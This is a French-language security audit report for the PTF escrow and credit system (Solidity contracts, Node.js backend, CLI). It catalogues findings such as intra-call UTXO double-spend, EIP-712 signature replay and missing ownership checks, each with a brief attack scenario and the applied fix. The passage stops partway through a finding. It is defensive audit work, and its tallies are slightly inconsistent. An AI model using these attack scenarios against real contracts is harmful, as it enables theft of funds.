# PTF — Security Audit Reference

**Version auditée :** v0.1.0 (commit `6a06212`) + rounds 5–14 (2026-07-31 / 2026-08-01)
**Date de l'audit :** 2026-08-01 (dernière mise à jour)
**Méthode :** Workflow multi-agents adversarial (5 dimensions × vérification indépendante) + audit CIA complet (Confidentialité / Intégrité / Disponibilité) + corrections manuelles sur 14 rounds
**Périmètre :** Smart contracts EVM, backend Node.js/TypeScript, CLI TypeScript, système d'authentification, workers on-chain (deposit + reconciliation)
**Résultat :** 101 findings — 101 corrigés, 0 ouvert

---

## Table des matières

1. [Résumé exécutif](#résumé-exécutif)
2. [Architecture du système et surfaces d'attaque](#architecture-du-système-et-surfaces-dattaque)
3. [Findings corrigés — Smart contracts](#findings-corrigés--smart-contracts)
4. [Findings corrigés — Backend UTXO](#findings-corrigés--backend-utxo)
5. [Findings corrigés — CLI](#findings-corrigés--cli)
6. [Findings ouverts](#findings-ouverts)
7. [Invariants de sécurité](#invariants-de-sécurité)
8. [Guide pour futurs audits](#guide-pour-futurs-audits)

---

## Résumé exécutif

### Rounds 1–4 — Smart contracts + Backend UTXO + CLI

| Sévérité | Trouvés | Corrigés | Ouverts |
|----------|---------|----------|---------|
| Critical | 9 | 9 | 0 |
| High | 17 | 16 | 1 |
| Medium | 6 | 5 | 1 |
| Low | 2 | 2 | 0 |
| Infrastructure | 2 | 0 | 2 |
| **Sous-total** | **36** | **32** | **3** |

### Rounds 5–10 — Audit CIA + Auth + Licences

| Domaine | Findings | Corrigés | Ouverts |
|---------|----------|----------|---------|
| Confidentialité | 8 | 7 | 1 |
| Intégrité | 13 | 11 | 2 |
| Disponibilité | 8 | 8 | 0 |
| Auth (refonte) | 15 | 15 | 0 |
| **Sous-total** | **44** | **41** | **3** |

### Round 11 — Correction des 7 findings ouverts

| Finding | Sévérité | Corrigé |
|---------|----------|---------|
| S9 — Change UTXOs non-soumissibles on-chain | HIGH | ✅ Signature EIP-712 avec `PTF_OPERATOR_PRIVATE_KEY` |
| CIA-C4 — Signatures UTXO exposées dans le schéma GraphQL | HIGH | ✅ `eip712Signature` retiré du type `CreditUTXO` public |
| CIA-C6 — OAuth GitHub sans state CSRF | HIGH | ✅ `requestGithubOAuthState` + vérification nonce dans `linkGithub` |
| CIA-D2 — Pas de rate limiting | HIGH | ✅ `express-rate-limit` (global 300/15min + auth 20/15min) |
| CIA-D5 — Pas de limites profondeur GraphQL | HIGH | ✅ `depthLimitRule` (max 6) dans `ApolloServer.validationRules` |
| CIA-I7 — Redlock fallback no-op | HIGH | ✅ `throw new Error` au lieu du no-op silencieux |
| N1 — Pas de worker on-chain pour les dépôts | CRITICAL | ✅ `DepositWorker` (`CreditClaimed` → `mint`, `UTXOSpent` → réconciliation) |
| **Sous-total** | | **7/7** |

**Total général rounds 1–11 : 80 findings — 78 corrigés — 2 ouverts**

Les 2 findings restants nécessitent une infrastructure de scan de blocs rétroactif :

---

### Round 12 — Audit complet PTF (2026-08-01) — 21 findings supplémentaires, 21 corrigés

| Sévérité | Findings | Corrigés | Ouverts |
|----------|----------|----------|---------|
| Critical | 2 | 2 | 0 |
| High | 7 | 7 | 0 |
| Medium | 11 | 11 | 0 |
| Low | 1 | 1 | 0 |
| **Sous-total** | **21** | **21** | **0** |

| Finding | Sévérité | Description | Corrigé |
|---------|----------|-------------|---------|
| C1 | CRITICAL | `mintUTXOReceipt` écrivait dans `spentUTXOs` → tout UTXO minté était définitivement non-retirable | ✅ `mintedUTXOs` séparé + `UTXOAlreadyMinted` |
| C2 | CRITICAL | `verifyProof` change UTXOs toujours `false` (digest incohérent prod/dev) | ✅ digest aligné + `recoverAddress` en prod |
| H1 | HIGH | `TaskService.expire()` : ledger fantôme si `confiscate()` échoue | ✅ flag `confiscated` + guard before ledger write |
| H2+H3 | HIGH | `ReputationService.applyDelta()` : race condition + write on-chain orphelin | ✅ `$transaction` atomique + check walletLink avant on-chain |
| H4 | HIGH | `TaskService.cancel()` : statuts manquants + absence de Redlock | ✅ guard élargi + `redlock.acquire()` |
| H5 | HIGH | `task.resolver.ts` : `getPublicView` toujours `'public'` | ✅ chargement réel de `project.type` |
| H6 | HIGH | `EscrowVault.softLock` non-custodial contournable | ✅ `safeTransferFrom` → vault custody |
| H7 | HIGH | `executePunishment` mintait 20% à `address(this)` (supply morte) | ✅ `ptfToken.mint(treasury, projectShare)` + `projectPunishmentFunds` |
| M1 | MEDIUM | `DepositWorker` : `ptfSignature: utxoId` (non-signature stockée) | ✅ `deposit:${utxoId}` + early-return dans `verifyProof` |
| M2 | MEDIUM | `walletStatus` : `getLinkedChains(address)` au lieu de `userId` | ✅ resolver corrigé |
| M3 | MEDIUM | `WalletService.getBalance()` : `softLocked` calculé sans filtre `paid` | ✅ filtre `rewardMode: "paid"` |
| M4 | MEDIUM | `utxoProvenance` : chargement en mémoire avant pagination JS | ✅ `take`/`skip` passés à Prisma |
| M5 | MEDIUM | `ClaimCriteria` : `minCompletedTasks`/`maxActiveTasks` jamais vérifiés | ✅ checks ajoutés dans `claim()` |
| M6 | MEDIUM | `project.service.ts` : double clé `status` écrasait le filtre | ✅ fusion conditionnelle des filtres |
| M7 | MEDIUM | `myTasks` : `ctx.user.userId` passé comme `devAddress` | ✅ résolution wallet Ethereum réelle |
| M8 | MEDIUM | `submitTask`/`cancelTask` : `wallets[0]` sans filtre `chain` | ✅ match par `task.devAddress` |
| M9 | MEDIUM | `EscrowVault` : check `InvalidDistribution` tautologique (dead code) | ✅ supprimé + `require(BPS == 10000)` dans constructor |
| M10 | MEDIUM | `EscrowVault` : `verifiedTotal > totalAmount` → surplus silencieux | ✅ `!=` au lieu de `<` |
| M11 | MEDIUM | `CreateProjectResult` : incohérence `id` vs `projectId` | ✅ `id: ID!` exposé + rétro-compat |
| L1 | LOW | `ReputationRegistry.getLevel()` : external self-call coûteux | ✅ accès direct `_scores[dev]` |

**Total général rounds 1–12 : 101 findings — 99 corrigés — 2 ouverts (corrigés en round 14)**

---

## Architecture du système et surfaces d'attaque

```
┌─────────────────────────────────────────────────────────────────┐
│  CLI (TypeScript)                                               │
│  cli/src/commands/wallet.ts     ← surface: inputs utilisateur   │
│  cli/src/utils/api.ts           ← surface: config réseau        │
└──────────────────────┬──────────────────────────────────────────┘
                       │ GraphQL (HTTPS)
┌──────────────────────▼──────────────────────────────────────────┐
│  Backend (Node.js + Prisma)                                     │
│  graphql/resolvers/wallet.resolver.ts  ← auth, ownership        │
│  services/utxo.service.ts              ← UTXO state machine     │
│  services/task.service.ts              ← soft-lock lifecycle     │
│  services/punishment.service.ts        ← pénalité + UTXO burn   │
│  services/creditLedger.service.ts      ← audit trail            │
└──────────────────────┬──────────────────────────────────────────┘
                       │ ethers.js / RPC
┌──────────────────────▼──────────────────────────────────────────┐
│  Smart Contracts (Solidity 0.8 / Polygon)                       │
│  EscrowVault.sol    ← UTXO withdrawal, punishment, escrow       │
│  CreditToken.sol    ← ERC-20 PTF token                          │
│  ProjectRegistry.sol                                            │
│  ReputationRegistry.sol                                         │
└─────────────────────────────────────────────────────────────────┘
```

### Flux UTXO complet (chemin critique)

```
Task validée
  └─► UTXOService.mint()          → CreditUTXO{status:unspent} en DB
  └─► EscrowVault.mintUTXOReceipt() → CreditClaimed event on-chain

Retrait demandé
  └─► UTXOService.spend()         → sélection + marquage atomique (Prisma $transaction)
  └─► EscrowVault.withdrawWithProof() → verify EIP-712 sigs + burn PTF + transfer USDC

Pénalité
  └─► PunishmentService           → UTXOService.spend() + EscrowVault.executePunishment()
```

---

## Findings corrigés — Smart contracts

### [S1] CRITICAL — Double-spend intra-call

| | |
|---|---|
| **Fichier** | `contracts/evm/EscrowVault.sol` |
| **Fonction** | `withdrawWithProof()` |
| **Commit correction** | `03fe287` |

**Problème :** Le mapping `spentUTXOs` n'était mis à jour qu'après la boucle de vérification complète. Soumettre le même `utxoId` deux fois dans le tableau `inputs[]` d'un seul appel doublait `verifiedTotal` sans déclencher le guard cross-call.

**Scénario d'attaque :**
```
attaquant possède un UTXO de 100 PTF (id = X)
inputs = [X, X]
→ verifiedTotal = 200 (double)
→ withdraw 200 PTF avec un seul UTXO légitime
```

**Correction :**
```solidity
bytes32[] memory seenIds = new bytes32[](inputs.length);
for (uint256 i = 0; i < inputs.length; i++) {
    for (uint256 j = 0; j < i; j++) {
        if (seenIds[j] == inp.utxoId) revert UTXOAlreadySpent(inp.utxoId);
    }
    seenIds[i] = inp.utxoId;
    // puis guard cross-call spentUTXOs
```

---

### [S2] CRITICAL — Signatures UTXO sans domain separator

| | |
|---|---|
| **Fichier** | `contracts/evm/EscrowVault.sol` |
| **Fonction** | `withdrawWithProof()` |
| **Commit correction** | `03fe287` |

**Problème :** `utxoStructHash.recover(sig)` — le struct hash brut sans préfixe `"\x19\x01" || domainSeparator` n'est pas conforme EIP-712. Une signature valide sur le contrat A était valide sur le contrat B et sur toute autre chaîne.

**Scénario d'attaque :** Replay cross-contract et cross-chain d'une même signature UTXO.

**Correction :**
```solidity
// Avant (vulnérable)
address signer = utxoStructHash.recover(inp.ptfSignature);

// Après (correct)
address signer = _hashTypedDataV4(utxoStructHash).recover(inp.ptfSignature);
// _hashTypedDataV4 = keccak256("\x19\x01" || domainSeparator || structHash)
// domainSeparator : name="PTFEscrowVault", version="1", chainId=137
```

---

### [S3] HIGH — Chain hardcodée dans la vérification UTXO

| | |
|---|---|
| **Fichier** | `contracts/evm/EscrowVault.sol` |
| **Fonction** | `withdrawWithProof()` |
| **Commit correction** | `03fe287` |

**Problème :** `keccak256(bytes("polygon"))` encodé en dur dans le struct hash de vérification. Un UTXO émis sur Ethereum pouvait être rejoué sur Polygon (le champ `chain` du struct était ignoré).

**Scénario d'attaque :** Attaquant avec des UTXOs Ethereum les soumet sur le contrat Polygon.

**Correction :**
```solidity
// Avant
keccak256(bytes("polygon"))

// Après
keccak256(bytes(inp.chain))  // vérifie le champ chain fourni par le caller
```

**Note :** Le contrat ne valide pas que `inp.chain` correspond à la chaîne réelle d'exécution — cette validation est faite off-chain par le backend PTF avant signature.

---

### [S4] HIGH — `mintUTXOReceipt` sans idempotency guard

| | |
|---|---|
| **Fichier** | `contracts/evm/EscrowVault.sol` |
| **Fonction** | `mintUTXOReceipt()` |
| **Commit correction** | `03fe287` |
| **Raffinement** | Round 12 [C1] — `mintedUTXOs` séparé de `spentUTXOs` |

**Problème initial :** Aucune vérification que `utxoId` n'a pas déjà été minté → inflation PTF illimitée.

**Correction initiale (Round 3) :**
```solidity
if (spentUTXOs[utxoId]) revert UTXOAlreadySpent(utxoId);
spentUTXOs[utxoId] = true;
```

**Bug introduit :** Partager `spentUTXOs` pour le mint ET le retrait rendait tout UTXO minté immédiatement non-retirable (C1, Round 12).

**Correction finale (Round 12 — C1) :**
```solidity
// Deux mappings distincts et indépendants
mapping(bytes32 => bool) public spentUTXOs;   // retrait uniquement
mapping(bytes32 => bool) public mintedUTXOs;  // mint uniquement

// mintUTXOReceipt — guard d'idempotence
if (mintedUTXOs[utxoId]) revert UTXOAlreadyMinted(utxoId);
mintedUTXOs[utxoId] = true;

// withdrawWithProof — guard double-spend
if (spentUTXOs[inp.utxoId]) revert UTXOAlreadySpent(inp.utxoId);
```

Un `utxoId` dans `mintedUTXOs` n'implique PAS qu'il est dans `spentUTXOs` — les UTXOs mintés restent retirables.

---

### [S5] MEDIUM — `executePunishment` polluait `escrowBalance` (USDC) avec des unités PTF

| | |
|---|---|
| **Fichier** | `contracts/evm/EscrowVault.sol` |
| **Fonction** | `executePunishment()` |
| **Commit correction** | `03fe287` |

**Problème :** `escrowBalance[projectId] += projectShare` ajoutait des unités PTF (représentant 20% de la pénalité) à un mapping qui stocke des USDC. Après une pénalité, `escrowBalance[projectId]` était artificiellement gonflé, permettant un retrait USDC supérieur au dépôt réel.

**Scénario d'attaque :** Projet malicieux déclenche une pénalité sur lui-même pour gonfler `escrowBalance`, puis retire plus d'USDC qu'il n'a déposé.

**Correction :** Suppression de la ligne. Les 20% sont mintés en PTF au contrat PTF (treasury) sans toucher `escrowBalance`.

---

## Findings corrigés — Backend UTXO

### [H1] HIGH — TOCTOU : coin-selection hors transaction

| | |
|---|---|
| **Fichier** | `backend/src/services/utxo.service.ts` |
| **Fonction** | `spend()` |
| **Commit correction** | `03fe287` |

**Problème :** `getUnspent()` était appelé avant le `$transaction`. Deux appels `spend()` concurrent lisaient le même snapshot et sélectionnaient les mêmes UTXOs. Le second `updateMany` réussissait silencieusement en écrasant le statut déjà `"spent"`.

**Scénario d'attaque :** Race condition : deux retraits simultanés pour le même montant consomment les mêmes UTXOs → double-spend off-chain.

**Correction :** La coin-selection (findMany, boucle greedy, updateMany, create change, create tx) est entièrement déplacée dans `$transaction`. Prisma garantit l'isolation via snapshot transactionnel.

---

### [H2] HIGH — `proofHash` incompatible on-chain / off-chain

| | |
|---|---|
| **Fichiers** | `utxo.service.ts:162`, `EscrowVault.sol:451` |
| **Commit correction** | `03fe287` |

**Problème :**
- Off-chain : `proofHash = keccak256(eip712Sig_1 || eip712Sig_2 || …)` — hachage des signatures
- On-chain : `proofHash = keccak256(utxoId_1 || utxoId_2 || …)` — hachage des IDs

Les deux valeurs divergeaient → le hash stocké en DB ne correspondait jamais à celui émis on-chain → audit trail cassé.

**Correction :** Off-chain aligné sur on-chain : `keccak256(utxoId_1 || utxoId_2 || …)`.

---

### [H3] HIGH — `verifyProof()` digest EIP-712 incomplet

| | |
|---|---|
| **Fichier** | `backend/src/services/utxo.service.ts` |
| **Fonction** | `verifyProof()` |
| **Commit correction** | `03fe287` |

**Problème :** `ethers.recoverAddress(structHash, sig)` — le struct hash seul ne reconstitue pas correctement l'adresse signataire. La récupération échouait systématiquement pour toute signature réelle EIP-712.

**Correction :**
```typescript
// Avant
const recovered = ethers.recoverAddress(structHash, sig);

// Après — digest EIP-712 complet
const domainSeparator = ethers.keccak256(ethers.AbiCoder.defaultAbiCoder().encode(
  ["bytes32", "bytes32", "bytes32", "uint256", "address"],
  [DOMAIN_TYPEHASH, ethers.keccak256(ethers.toUtf8Bytes("PTFEscrowVault")),
   ethers.keccak256(ethers.toUtf8Bytes("1")), 137n, contractAddress]
));
const digest = ethers.keccak256(
  ethers.concat([ethers.toUtf8Bytes("\x19\x01"), domainSeparator, structHash])
);
const recovered = ethers.recoverAddress(digest, sig);
```

---

### [H4] HIGH — Change UTXOs acceptés sans vérification de signature

| | |
|---|---|
| **Fichier** | `backend/src/services/utxo.service.ts` |
| **Fonction** | `verifyProof()` |
| **Commit correction** | `03fe287` |

**Problème :** `return true` inconditionnel pour `sourceType === 'change'` — n'importe quel UTXO de type change passait la vérification sans contrôle.

**Correction :** Vérification que `eip712Signature === keccak256(parentTx.proofHash || changeId)` en récupérant la transaction parente depuis la DB.

---

### [S6] HIGH — `lock()` TOCTOU avec `spend()` concurrent

| | |
|---|---|
| **Fichier** | `backend/src/services/utxo.service.ts` |
| **Fonction** | `lock()` |
| **Commit correction** | `03fe287` |

**Problème :** `lock()` lisait les UTXOs hors transaction. Un appel `spend()` concurrent pouvait consommer les mêmes UTXOs entre le `findMany` de `lock()` et son `updateMany`.

**Scénario :** Task claim + retrait simultané → les 10 PTF de garantie sont à la fois locked et spent.

**Correction :** `lock()` entièrement enveloppé dans `this.db.$transaction`.

---

### [S7] HIGH — Domain mismatch EIP-712 backend vs contrat

| | |
|---|---|
| **Fichier** | `backend/src/services/utxo.service.ts` |
| **Commit correction** | `03fe287` |

**Problème :** Le domaine EIP-712 côté backend utilisait `name: "PTFEscrow"` tandis que le contrat EscrowVault était initialisé avec `EIP712("PTFEscrowVault", "1")`. Les domainSeparators divergeaient → `recoverAddress` retournait une mauvaise adresse → toutes les vérifications de signature off-chain échouaient.

**Correction :** Domain aligné sur `"PTFEscrowVault"` dans le backend.

---

### [R1] HIGH — `spend()` deux appels `Date.now()` — txId non-déterministe sur retry

| | |
|---|---|
| **Fichier** | `backend/src/services/utxo.service.ts` |
| **Commit correction** | `03fe287` |

**Problème :** `txId` et `changeUTXOId` utilisaient chacun `Date.now()` séparément. Si Prisma retenait la transaction (retry automatique), les deux appels pouvaient retourner des timestamps différents → `txId` incohérent avec `changeUTXOId`.

**Correction :** `const spendNow = Date.now()` capturé une seule fois avant le bloc `$transaction`, réutilisé pour les deux.

---

### [R2] HIGH — `unlock()` silencieux sur solde insuffisant

| | |
|---|---|
| **Fichier** | `backend/src/services/utxo.service.ts` |
| **Commit correction** | `03fe287` |

**Problème :** Si les UTXOs locked ne couvraient pas le montant demandé, le bloc `if (remaining > 0)` était vide — `unlock()` retournait `undefined` silencieusement après un déverrouillage partiel.

**Correction :** `throw new Error(...)` ajouté, identique au comportement de `lock()`.

---

### [H2b] HIGH — `computeProofHash` hachait les signatures au lieu des utxoIds

| | |
|---|---|
| **Fichier** | `backend/src/services/utxo.service.ts` |
| **Fonction** | `computeProofHash()` (exportée) |
| **Commit correction** | `03fe287` |

**Problème :** La fonction publique `computeProofHash()` concaténait les signatures EIP-712 (`u.eip712Signature`) mais `spend()` concaténait les IDs (`u.id`) — les deux fonctions produisaient des hashes différents pour le même set d'UTXOs.

**Correction :** `computeProofHash` réécrit pour concaténer `u.id` (bytes32), cohérent avec `spend()` et on-chain.

---

### [C2] CRITICAL — `withdrawCredits` passait un cuid Prisma comme `ownerAddress`

| | |
|---|---|
| **Fichier** | `backend/src/graphql/resolvers/wallet.resolver.ts` |
| **Commit correction** | `03fe287` |

**Problème :** `ctx.user.userId` est un cuid Prisma (`clx3ab…`), pas une adresse Ethereum. Passé directement à `UTXOService.spend({ ownerAddress })`, aucun UTXO n'était trouvé car ils sont indexés par adresse Ethereum.

**Correction :**
```typescript
const wallets = await ctx.services.wallet.getLinkedChains(ctx.user.userId);
const walletLink = wallets.find(w => w.chain === args.chain);
// ownerAddress = walletLink.address (adresse Ethereum)
```

---

### [C3] CRITICAL — `TaskService` sans `UTXOService` — reward jamais minté

| | |
|---|---|
| **Fichiers** | `backend/src/services/task.service.ts`, `backend/src/container.ts` |
| **Commit correction** | `03fe287` |

**Problème :** `TaskService` n'avait aucune dépendance sur `IUTXOService`. Valider une tâche ne créait aucun UTXO — les développeurs ne recevaient pas leur récompense.

**Correction :** `IUTXOService` ajouté comme 7ème paramètre du constructeur. `lock()` appelé au `claim()`, `unlock()` au `cancel()` et `expire()`.

---

### [C4] CRITICAL — `TaskService.expire()` ne libérait pas le soft-lock

| | |
|---|---|
| **Fichier** | `backend/src/services/task.service.ts` |
| **Commit correction** | `03fe287` |

**Problème :** `expire()` passait le statut à `"expired"` sans appeler `walletService.softUnlock()` ni `utxoService.unlock()` — les 10 PTF de garantie restaient gelés définitivement.

**Correction :** Séquence complète : `softUnlock()` → `utxoService.unlock()` → `creditLedger.record('soft_unlocked')` → `status = "expired"`.

---

### [C5] CRITICAL — `PunishmentService` ne consommait pas les UTXOs

| | |
|---|---|
| **Fichiers** | `backend/src/services/punishment.service.ts`, `backend/src/container.ts` |
| **Commit correction** | `03fe287` |

**Problème :** `PunishmentService` appelait `adapter.deductPenalty()` (burn on-chain) et `creditLedger.record()`, mais jamais `UTXOService.spend()`. Le ledger UTXO divergeait de l'état on-chain après chaque pénalité.

**Correction :** `utxoService.spend()` appelé après le burn on-chain. En cas d'UTXOs insuffisants (déjà dépensés), l'erreur est absorbée — le burn on-chain est canonique.

---

### [M1] MEDIUM — `CreditEvent.balanceAfter` absent du schéma Prisma

| | |
|---|---|
| **Fichier** | `backend/prisma/schema.prisma` |
| **Commit correction** | `03fe287` |

**Problème :** `CreditLedgerService.record()` passait `balanceAfter` à Prisma mais le champ n'existait pas dans le modèle — erreur runtime silencieuse sur chaque écriture de ledger.

**Correction :** `balanceAfter Float?` ajouté sur `CreditEvent`.

---

### [N4] MEDIUM — `CreditTransaction.inputIds/outputIds` sans FK

| | |
|---|---|
| **Fichier** | `backend/prisma/schema.prisma`, `utxo.service.ts` |
| **Commit correction** | `6a06212` |

**Problème :** `inputIds String[]` et `outputIds String[]` étaient des tableaux de strings sans contrainte référentielle. Supprimer un `CreditUTXO` ne déclenchait aucune cascade ni erreur sur la transaction.

**Correction :**
- Suppression de `inputIds`/`outputIds` de `CreditTransaction`
- Ajout de `createdInTxId String?` sur `CreditUTXO` (FK vers la transaction créatrice)
- Relations Prisma : `CreditUTXO.spendingTx @relation("inputs")` et `CreditUTXO.creationTx @relation("outputs")`
- Traversabilité : `tx.inputs[]` / `tx.outputs[]` via includes Prisma

---

## Findings corrigés — CLI

### [C1] CRITICAL — `isOffline()` toujours `true` pour toute URL de production

| | |
|---|---|
| **Fichier** | `cli/src/utils/api.ts:204` |
| **Commit correction** | `03fe287` |

**Problème :**
```typescript
// Avant — logique inversée
this.offline = !config.ptfApiUrl || config.ptfApiUrl.includes("localhost") === false;
// `includes("localhost") === false` est TOUJOURS true pour une URL de prod
// → offline = true pour toute URL non-localhost
```

**Correction :**
```typescript
this.offline = !config.ptfApiUrl;  // offline uniquement si pas d'URL configurée
```

---

### [C6] CRITICAL — `cancelTask` sans vérification d'ownership

| | |
|---|---|
| **Fichier** | `backend/src/graphql/resolvers/task.resolver.ts` |
| **Commit correction** | `03fe287` |

**Problème :** N'importe quel utilisateur authentifié pouvait appeler `cancelTask(taskId)` et annuler la tâche de quelqu'un d'autre.

**Scénario d'attaque :** Annuler les tâches d'un concurrent pour lui faire perdre sa garantie de 10 PTF et sa réputation.

**Correction :**
```typescript
const wallets = await ctx.services.wallet.getLinkedChains(user.id);
const isOwner = wallets.some(w => w.address.toLowerCase() === task.devAddress.toLowerCase());
if (!isOwner) throw new GraphQLError("Unauthorized", { extensions: { code: "UNAUTHORIZED" } });
```

---

### [H5] HIGH — `withdraw` online sans gestion d'erreur

| | |
|---|---|
| **Fichier** | `cli/src/commands/wallet.ts` |
| **Commit correction** | `03fe287` |

**Problème :** `client.query()` sans try/catch. Une erreur réseau ou un solde insuffisant renvoyait une exception non gérée avec stack trace exposé à l'utilisateur.

**Correction :** Bloc try/catch avec `printError()` et `process.exit(1)`.

---

### [H8] HIGH — Chain hardcodée `'polygon'` dans la mutation withdraw

| | |
|---|---|
| **Fichier** | `cli/src/commands/wallet.ts` |
| **Commit correction** | `03fe287` |

**Problème :** `chain: 'polygon'` en dur dans la mutation GraphQL, ignorant `userConfig.walletChain`.

**Correction :** `const chain = userConfig.walletChain ?? "polygon"`.

---

### [N5] LOW — Mock UTXO IDs tronqués en mode offline

| | |
|---|---|
| **Fichier** | `cli/src/commands/wallet.ts:150-159` |
| **Commit correction** | `6a06212` |

**Problème :** IDs mock `"0xutxo001…"` — chaînes tronquées avec `…`, non-conformes au format bytes32 (`0x` + 64 hex chars). Toute validation de format les rejetait.

**Correction :** Remplacement par des hashes hex 32-bytes complets (`0xc001a1b2…`).

---

## Findings ouverts (0 restant)

Tous les findings de sécurité sont désormais corrigés. Les 2 derniers items d'infrastructure (N3, CIA-I9) ont été résolus dans le round 14.

---

### [N3] MEDIUM — ~~Pas de job de réconciliation rétroactif après crash prolongé~~ ✅ CORRIGÉ

| | |
|---|---|
| **Fichier** | `backend/src/workers/reconciliation.worker.ts` |
| **Statut** | ✅ Corrigé — `ReconciliationWorker` implémenté |

**Solution implémentée :**
1. Modèle `SyncCheckpoint` en Prisma (table `chain + contractAddress → lastBlock`)
2. `ReconciliationWorker` — job périodique (60s par défaut) qui :
   - Lit le dernier bloc traité depuis `SyncCheckpoint`
   - Scanne `CreditClaimed` / `UTXOSpent` via `queryFilter()` en batches de 2000 blocs
   - Applique `UTXOService.mint()` avec idempotency (duplicate check par `sourceId`)
   - Marque les UTXOs dépensés on-chain comme `spent` en DB
   - Sauvegarde le checkpoint après chaque lot (`upsert`)
3. Intégré dans `server.ts` — arrêt gracieux via SIGTERM/SIGINT

---

### [CIA-I9] HIGH — ~~DB commit avant confirmation on-chain~~ ✅ CORRIGÉ

| | |
|---|---|
| **Fichier** | `backend/src/workers/reconciliation.worker.ts` (méthode `detectStaleSpent`) |
| **Statut** | ✅ Corrigé — détection et revert automatique |

**Solution implémentée :** Pattern saga avec réconciliation automatique :
- `spend()` commit la DB en premier (optimistic) avec `txHash: null`
- Le caller met à jour `txHash` après confirmation on-chain
- `detectStaleSpent()` scanne les UTXOs `spent` dont le `CreditTransaction` n'a toujours pas de `txHash` après 10 minutes
- Ces UTXOs sont automatiquement revertés à `unspent` (la tx on-chain a échoué/revert)
- Seules les transactions de type `withdrawal` sont revertées — les punishments sont autoritaires côté DB

---

## Findings corrigés — Round 11

### [S9] HIGH — Change UTXOs : signature EIP-712 ECDSA avec clé opérateur

**Fichier :** `backend/src/services/utxo.service.ts`

Fonction `signChangeUTXO()` ajoutée. En production, `PTF_OPERATOR_PRIVATE_KEY` est obligatoire — throw si absent. Construit le digest EIP-712 complet (`\x19\x01 || domainSeparator || structHash`) et signe avec `ethers.Wallet(privKey).signMessage(digest)`. Dev/test : fallback keccak non-bloquant pour les tests sans clé.

---

### [CIA-C4] HIGH — Signatures UTXO retirées du schéma GraphQL public

**Fichier :** `backend/src/graphql/schema.graphql`, `backend/src/graphql/resolvers/wallet.resolver.ts`

`eip712Signature` supprimé du type `CreditUTXO` GraphQL. Les resolvers `utxos`, `utxoProvenance` et `withdrawCredits` strippent ce champ via `safeUtxo()` avant réponse.

---

### [CIA-C6] HIGH — OAuth GitHub CSRF : paramètre `state` ajouté

**Fichiers :** `backend/src/graphql/schema.graphql`, `backend/src/services/auth.service.ts`, `backend/src/graphql/resolvers/wallet.resolver.ts`

Nouvelle mutation `requestGithubOAuthState()` → nonce keccak256 TTL 10 min, stocké dans `AuthChallenge`. `linkGithub(code, state)` vérifie que `state` existe en DB, appartient au bon `userId`, n'est pas expiré ni consommé.

---

### [CIA-D2] HIGH — Rate limiting

**Fichier :** `backend/src/server.ts`

`express-rate-limit` (v7) installé : global 300 req/15 min + limiter auth 20 req/15 min sur les mutations sensibles (`register`, `login`, `verifyNewDevice`, `linkGithub`, `requestGithubOAuthState`, `requestWalletChallenge`, `confirmLinkWallet`).

---

### [CIA-D5] HIGH — Profondeur maximale GraphQL limitée

**Fichier :** `backend/src/server.ts`

`depthLimitRule` (profondeur max 6) injectée dans `ApolloServer({ validationRules })`. Implémentation inline sans dépendance externe.

---

### [CIA-I7] HIGH — Redlock fallback no-op supprimé

**Fichier :** `backend/src/services/task.service.ts`

Le `catch` no-op remplacé par `throw new Error(...)` — le serveur refuse de démarrer si Redis/Redlock est indisponible, plutôt que de silencieusement désactiver la protection de contention.

---

### [N1] CRITICAL — Worker on-chain pour les dépôts

**Fichier :** `backend/src/workers/deposit.worker.ts` (nouveau), `backend/src/server.ts`

`DepositWorker` écoute `CreditClaimed` → `UTXOService.mint()` (idempotency guard) et `UTXOSpent` → réconciliation DB. `maybeStartDepositWorker(prisma)` démarre si `RPC_WS_URL` et `ESCROW_VAULT_ADDRESS` sont définis, sinon warning gracieux. Intégré au démarrage et à l'arrêt gracieux du serveur.

---

## Findings corrigés — Round 12 (2026-08-01)

### [C1-R12] CRITICAL — `mintUTXOReceipt` bloquait définitivement `withdrawWithProof`

| | |
|---|---|
| **Fichiers** | `contracts/evm/EscrowVault.sol` |
| **Fonctions** | `mintUTXOReceipt()`, `withdrawWithProof()` |

**Problème :** Le guard d'idempotence de `mintUTXOReceipt()` écrivait dans `spentUTXOs[utxoId] = true`. Or `withdrawWithProof()` rejette tout UTXO dont `spentUTXOs[utxoId]` est `true`. Résultat : tout UTXO minté était immédiatement et définitivement non-retirable.

**Correction :** Séparation en deux mappings indépendants. Voir [S4] ci-dessus pour le détail complet.

---

### [C2-R12] CRITICAL — `verifyProof` change UTXOs retournait toujours `false`

| | |
|---|---|
| **Fichier** | `backend/src/services/utxo.service.ts` |
| **Fonctions** | `signChangeUTXO()`, `verifyProof()`, `spend()` |

**Problème (deux bugs distincts) :**
1. **Dev path** : `signChangeUTXO` calculait `keccak256([txId, changeId])` mais `verifyProof` comparait à `keccak256([proofHash, utxo.id])` — champs différents → toujours `false`.
2. **Prod path** : `signChangeUTXO` stockait une signature ECDSA 65 bytes mais `verifyProof` la comparait byte-à-byte à un hash 32 bytes → toujours `false`.

**Correction :**
- `signChangeUTXO` : ajout du paramètre `proofHash` ; dev fallback produit `keccak256([proofHash, changeId])`.
- `spend()` : passe `proofHash` à `signChangeUTXO`.
- `verifyProof` prod : `ethers.recoverAddress(digest, signature)` au lieu de comparaison de bytes.
- `verifyProof` deposit : early-return `true` (proof = event on-chain CreditClaimed).

---

### [H7-R12] HIGH — `executePunishment` : 20% minté à `address(this)` sans récupération

| | |
|---|---|
| **Fichier** | `contracts/evm/EscrowVault.sol` |
| **Fonction** | `executePunishment()` |

**Problème :** `ptfToken.mint(address(this), projectShare)` accumulait des tokens dans le contrat EscrowVault sans aucun mécanisme de retrait → supply morte permanente.

**Correction :**
```solidity
// Tracking comptable avant interactions
projectPunishmentFunds[projectId] += projectShare;

// Les deux parts vont au treasury
ptfToken.mint(treasury, treasuryShare);
ptfToken.mint(treasury, projectShare);  // 20% tracé dans projectPunishmentFunds
```

---

### [M1-R12] MEDIUM — `DepositWorker` : `ptfSignature: utxoId` (non-signature)

| | |
|---|---|
| **Fichier** | `backend/src/workers/deposit.worker.ts` |

**Problème :** `utxoId` (32 bytes) stocké comme signature ECDSA → `ethers.recoverAddress()` levait une exception catchée en `false` pour tous les dépôts.

**Correction :** `ptfSignature: \`deposit:${utxoId}\`` (marqueur explicite non-ECDSA) + early-return dans `verifyProof` pour `sourceType === "deposit"`.

---

### [M9-R12] MEDIUM — `executePunishment` : check `InvalidDistribution` tautologique

| | |
|---|---|
| **Fichier** | `contracts/evm/EscrowVault.sol` |

